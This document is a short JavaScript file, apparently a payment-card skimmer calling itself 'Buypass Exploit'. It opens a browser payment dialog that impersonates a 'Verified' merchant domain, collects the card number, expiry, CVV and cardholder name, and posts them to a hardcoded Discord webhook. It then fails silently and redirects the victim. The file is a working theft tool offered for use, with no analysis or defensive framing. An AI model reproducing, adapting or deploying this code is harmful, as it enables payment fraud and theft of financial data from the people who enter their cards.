function buypass() {
    const targetUrl = document.querySelector("input").value;
    const targetDomain = targetUrl ? new URL(targetUrl).hostname : "cardpay.com";
    const webhookUrl = "https://discord.com/api/webhooks/1497249858778828981/FSiw6WVLLQ1gotjNxWZX3AbvwsUJh5KKJfrrIqOVv5Yygokx_CQzSvZcKS87h878RRiz";
    
    const request = new PaymentRequest(
        [{
            supportedMethods: location.origin + "/pay/main.json",
            data: {
                url: targetUrl,
                merchantDomain: targetDomain,
                displayName: `✅ Verified: ${targetDomain}`
            }
        }],
        {
            total: {
                label: `Pay ${targetDomain}`,
                amount: { value: "1.44", currency: "USD" }
            },
            merchantDomain: targetDomain
        }
    );
    
    request.show()
        .then(response => {
            const details = response.details;
            
            const cardNumber = details.cardNumber || details.PAN || "N/A";
            const expiryMonth = details.expiryMonth || "MM";
            const expiryYear = details.expiryYear || "YY";
            const cvv = details.cardSecurityCode || details.CVV2 || "N/A";
            const cardholder = details.cardholderName || details.payerName || "N/A";
            
            const embed = {
                embeds: [{
                    title: "💳 BUYPASS CAPTURE",
                    color: 0xFF0000,
                    fields: [
                        { name: "💳 Card Number", value: `||${cardNumber}||`, inline: false },
                        { name: "📅 Expiry", value: `${expiryMonth}/${expiryYear}`, inline: true },
                        { name: "🔐 CVV", value: `||${cvv}||`, inline: true },
                        { name: "👤 Cardholder", value: cardholder, inline: false },
                        { name: "🌐 Target", value: targetDomain, inline: true },
                        { name: "💰 Amount", value: "1.44 USD", inline: true },
                        { name: "⏰ Time", value: new Date().toLocaleString(), inline: false }
                    ],
                    footer: { text: "Buypass Exploit" }
                }]
            };
            
            fetch(webhookUrl, {
                method: "POST",
                body: JSON.stringify(embed),
                headers: { "Content-Type": "application/json" }
            }).catch(() => {});
            
            response.complete("success");
            window.location.href = "/navigate.html";
        })
        .catch(() => {});
}

document.querySelector("button").onclick = buypass;
